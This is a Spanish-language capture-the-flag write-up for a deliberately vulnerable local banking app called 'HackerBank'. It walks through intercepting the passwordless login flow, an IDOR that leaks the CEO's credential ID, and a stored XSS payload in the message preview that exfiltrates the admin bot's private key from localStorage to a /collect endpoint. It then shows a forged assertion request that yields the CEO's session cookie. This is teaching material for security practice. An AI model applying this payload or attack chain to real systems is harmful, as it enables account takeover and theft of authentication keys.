# HackerBank — CTF

## ENUNCIADO

HackerBank, una prestigiosa firma bancaria, presume de tener el login passwordless más fortalecido del mundo: "seguro como una passkey FIDO2, ni nosotros podríamos robar la llave de un cliente". Te dieron una cuenta de prueba para que lo pongas a prueba (usuario: `t3ny`, sin contraseña: entrás mediante un PIN generado con Windows Hello). ¿Pero será tan inquebrantable como dicen? Tu objetivo es loguearte como el CEO y llevarte el código que guarda en su cuenta.

> "Usan Windows Hello de adorno, pero el secreto real es robable".

- **Pista:** al CEO le encanta leer los mensajes de sus clientes.
- **Pista:** la clave privada del usuario logueado "viaja en algún lado" del navegador (una clara falla de implementación del FIDO 2).

- El `http://localhost:5000/` contiene la página principal del desafío.
- El `http://localhost:5001/` se coloca la URL del desafío que abrirá el CEO (una vez cada 60 s.) y pueda ser atacado por el XSS. Se debe colocar `http://localhost:5000/inbox` ya que el XSS está ahí.

## CAPA 1 – RECONOCIMIENTO DEL FLUJO MEDIANTE BURPSUITE

1. Ingresar en `/login` y tipear el usuario `t3ny` y apretar el botón de la cara. Windows Hello se activará pidiendo el PIN.

2. Con BurpSuite, se deben interceptar las peticiones que son:

- `POST /auth/hello/options {"username":"t3ny"}` → el navegador genera el challenge, user_id y rpId.
- `GET /auth/keys/<nombre_usuario>` → retorna un credential_id y la clave pública.
- `POST /auth/hello/assert` → body con id, response.clientDataJSON, response.signature. Esta petición es la que permite iniciar sesión y pide el username, el id (el credential_id del usuario a loguearse), el clientDataJSON y la firma. Debemos conseguir estos parámetros pero para el CEO.

El Windows Hello es un falso teatro y está mal implementado. El PIN real del Windows Hello se pide pero su flujo se descarta y lo que realmente autentica es una clave privada de la sesión iniciada que está en el Local storage que se puede ver con el F12 del navegador. Lo que tenemos que hacer es robar la clave privada del CEO que se está ejecutando en un contenedor mediante XSS.

## CAPA 2 – OBTENER EL credential_ID del CEO (IDOR)

Para obtenerlo tenemos que cambiar el `GET /auth/keys/t3ny` por "ceo", mandar la petición, lo que devolverá el credential_id del CEO. La guardamos para usarla más adelante.

## CAPA 3 – ROBAR LA CLAVE PRIVADA AL CEO

En "Mensajes al administrador" (`/mensajes`) se le escriben mensajes al CEO, que él revisa. Hay un campo que muestra sobre cómo verá el CEO este mensaje. Es una buena pista para el que resuelve el desafío se dé cuenta que ese campo es vulnerable a XSS.

1. Comprobar el XSS mandando `<b>hola</b>`: el campo "Vista previa" lo mostrará en negrita (señal de que no se escapa el HTML).

2. Se puede inyectar un XSS con el siguiente código para obtener la clave privada del CEO:

```json
{"body":"Hola.<script>window.addEventListener('load',function(){var u=document.getElementById('nombre_usuario').innerText;if(u!=='t3ny'){new Image().src='/collect?data='+encodeURIComponent(localStorage.getItem('hb_privkey_'+u));}});</script>"}
```

Posteriormente, hay un botón para forzar al CEO a ver su bandeja de entrada (1 vez por minuto). El CEO entra a la bandeja y ejecuta el payload.

3. En `http://localhost:5001` se debe escribir la URL `http://localhost:5000/inbox` para que el CEO lo vea.

4. Luego de unos segundos, en `/collected`, se mostrará la clave privada del CEO (que la tenía guardada en su navegador).

## FASE 4 – FIRMAR EL CHALLENGE DEL CEO Y ACCEDER

Con el credential_id (Capa 2) y la clave privada (Capa 3):

1. Existe una función en F12 desde Console, llamada `hbSign(clavePrivada, challenge)`, donde retorna la firma (signature) y el clientDataJSON.

2. Posteriormente, en el repeater del `POST /assert` se ingresa todos los campos encontrados anteriormente:

```json
{"username":"ceo",
 "credential_id":"<credential_id del CEO>",
 "type":"public-key",
 "response":{
   "clientDataJSON":"<cdjB64 del paso B>",
   "authenticatorData":"x",
   "signature":"<firma hex del paso B>"}}
```

Esto generará un Set-Cookie: session que se debe reemplazar en Applications en F12 y finalmente iniciará sesión en la cuenta del CEO.

> **Nota:** para manejar la parte de que el "CEO" entre cada 60s. se creó una carpeta llamada `agente/` que tiene el programa del bot (`agent.py`), el dockerfile, que es un servicio independiente con su propio agente llamado `hackerbank-agente`, separado del banco (`banco_app`) en donde se desarrolla el desafío. El contenedor tiene todas las dependencias para funcionar como un navegador Chrome y cada vez que se ejecuta se autogenera una clave privada que se guarda en el localStorage para que luego pueda ser robada por el que resuelve el desafío mediante XSS.
